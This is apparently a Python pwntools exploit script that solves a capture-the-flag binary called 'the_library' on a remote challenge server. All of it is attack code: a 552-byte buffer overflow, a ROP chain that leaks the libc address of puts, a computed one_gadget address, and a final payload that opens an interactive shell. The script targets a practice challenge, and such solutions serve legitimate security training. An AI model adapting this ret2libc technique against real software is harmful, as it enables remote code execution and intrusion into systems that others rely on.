from pwn import *
import struct

elf = ELF("./the_library")

p = remote("challenge.ctf.games",30384)

p.recvuntil(">")

buff = "A"*552
poprdi = p64(0x401493)
puts_plt = p64(0x403f98)
puts = p64(0x4010e0)
main = p64(0x4012a9)

p.sendline(buff+poprdi+puts_plt+puts+main)

p.recvline()
libc_puts = p.recvline()[:-1].ljust(8,"\x00")
u = make_unpacker(64, endian='little', sign='unsigned')
libc_puts = u(libc_puts)

libc = libc_puts-0x875a0
gadg = libc+0xe6c81

p.recvuntil(">")
p.sendline(buff+p64(gadg))
p.recv()

p.interactive()
